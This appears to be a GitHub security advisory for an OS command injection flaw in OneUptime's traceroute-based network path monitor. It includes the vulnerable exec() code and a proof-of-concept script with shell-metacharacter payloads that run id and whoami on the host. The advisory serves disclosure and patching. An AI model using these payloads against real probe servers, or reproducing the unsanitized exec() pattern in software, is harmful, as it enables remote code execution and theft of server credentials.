# [C] OneUptime: OS Command Injection in Probe NetworkPathMonitor via unsanitized destination in traceroute exec()

## Summary
Severity: Critical
Advisory: GHSA-jmhp-5558-qxh5
CVE: CVE-2026-27728
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-jmhp-5558-qxh5
Type: github-advisory

## Affected
- npm: `@oneuptime/common` — affected >=0 <10.0.7

## Details
## Summary

An OS command injection vulnerability in `NetworkPathMonitor.performTraceroute()` allows any authenticated project user to execute arbitrary operating system commands on the Probe server by injecting shell metacharacters into a monitor's destination field.

## Details

The vulnerability exists in [`Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts`](Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts), lines 149–191.

The `performTraceroute()` method constructs a shell command by directly interpolating the user-controlled `destination` parameter into a string template, then executes it via `child_process.exec()` (wrapped through `promisify`):

```typescript
// Line 13 — exec imported from child_process
import { exec } from "child_process";

// Line 15-17 — promisified into execAsync
const execAsync = promisify(exec);

// Lines 149-191 — destination is never sanitized
private static async performTraceroute(
    destination: string,  // ← attacker-controlled
    maxHops: number,
    timeout: number,
): Promise<TraceRoute> {
    // ...
    let command: string;
    if (isWindows) {
        command = `tracert -h ${maxHops} -w ${...} ${destination}`;
    } else if (isMac) {
        command = `traceroute -m ${maxHops} -w 3 ${destination}`;
    } else {
        command = `traceroute -m ${maxHops} -w 3 ${destination}`;
    }

    const tracePromise = execAsync(command);  // ← shell execution
```

The `destination` value originates from the public `trace()` method (line 31), which accepts `URL | Hostname | IPv4 | IPv6 | string` types. When a raw `string` is passed (line 47: `hostAddress = destination`), no validation or sanitization is performed before it reaches `performTraceroute()`.

`child_process.exec()` spawns a shell (`/bin/sh`), so any shell metacharacters (`;`, `|`, `$()`, `` ` ` ``, `&&`, `||`, `\n`) in `destination` will be interpreted, allowing full command injection.

## PoC


1. poc.cjs
```javascript
/**
 * PoC: OS Command Injection in OneUptime NetworkPathMonitor
 *
 * Replicates the exact vulnerable code path from
 * Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts:149-191
 */

const { exec } = require("child_process");
const { promisify } = require("util");
const execAsync = promisify(exec);

async function performTraceroute_VULNERABLE(destination, maxHops, timeout) {
    const isMac = process.platform === "darwin";
    const isWindows = process.platform === "win32";

    let command;
    if (isWindows) {
        command = `tracert -h ${maxHops} -w ${Math.ceil(timeout / 1000) * 1000} ${destination}`;
    } else if (isMac) {
        command = `traceroute -m ${maxHops} -w 3 ${destination}`;
    } else {
        command = `traceroute -m ${maxHops} -w 3 ${destination}`;
    }

    console.log(`[VULN] Constructed command: ${command}`);

    try {
        const { stdout, stderr } = await execAsync(command);
        return { stdout, stderr };
    } catch (err) {
        return { stdout: err.stdout || "", stderr: err.stderr || err.message };
    }
}

async function runPoC() {
    console.log("=== Payload 1: Semicolon chaining (;) ===");
    console.log("  destination = '127.0.0.1; id'\n");
    const r1 = await performTraceroute_VULNERABLE("127.0.0.1; id", 1, 5000);
    console.log("[stdout]:", r1.stdout);

    console.log("\n=== Payload 2: Pipe injection (|) ===");
    console.log("  destination = '127.0.0.1 | whoami'\n");
    const r2 = await performTraceroute_VULNERABLE("127.0.0.1 | whoami", 1, 5000);
    console.log("[stdout]:", r2.stdout);

    console.log("\n=== Payload 3: Subshell execution $() ===");
    console.log("  destination = '127.0.0.1$(echo INJECTED)'\n");
    const r3 = await performTraceroute_VULNERABLE("127.0.0.1$(echo INJECTED)", 1, 5000);
    console.log("[stderr]:", r3.stderr);
}

runPoC().catch(console.error);
```

2. Run the PoC:

```bash
node poc.cjs
```

3. **Expected output** (confirmed on macOS with Node.js v25.2.1):

```
=== Payload 1: Semicolon chaining (;) ===
  destination = '127.0.0.1; id'

[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1; id
[stdout]:  1  localhost (127.0.0.1)  0.215 ms  0.076 ms  0.055 ms
uid=501(dxleryt) gid=20(staff) groups=20(staff),12(everyone)...

=== Payload 2: Pipe injection (|) ===
  destination = '127.0.0.1 | whoami'

[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1 | whoami
[stdout]: dxleryt

=== Payload 3: Subshell execution $() ===
  destination = '127.0.0.1$(echo INJECTED)'

[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1$(echo INJECTED)
[stderr]: traceroute: unknown host 127.0.0.1INJECTED
```

The `id` and `whoami` commands execute successfully, proving arbitrary command execution. The subshell payload proves inline shell evaluation — `$(echo INJECTED)` is evaluated and appended to the hostname.

## Impact

**Vulnerability type:** OS Command Injection (CWE-78)

**Who is impacted:** Any authenticated user with the ability to create or edit a network path monitor in a OneUptime project can execute arbitrary operating system commands on the Probe server(s). In a multi-tenant SaaS deployment, this allows a malicious tenant to:

- **Execute arbitrary commands** as the Probe service user (Remote Code Execution)
- **Read sensitive files** from the Probe server (e.g., environment variables, credentials, service account tokens)
- **Pivot to internal services** accessible from the Probe's network position
- **Compromise other tenants' monitoring data** if Probes are shared across tenants
- **Establish persistent backdoors** (reverse shells, cron jobs, SSH keys)

> **Note:** The `NetworkPathMonitor` class is fully implemented and exported but not yet wired into the monitor execution pipeline (no callers import it). The vulnerability will become exploitable once this monitor type is integrated. The code is present in the current codebase and ready to be activated.

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jmhp-5558-qxh5
- https://nvd.nist.gov/vuln/detail/CVE-2026-27728
- https://github.com/OneUptime/oneuptime/commit/f2cce35a04fac756cecc7a4c55e23758b99288c1
- https://github.com/OneUptime/oneuptime
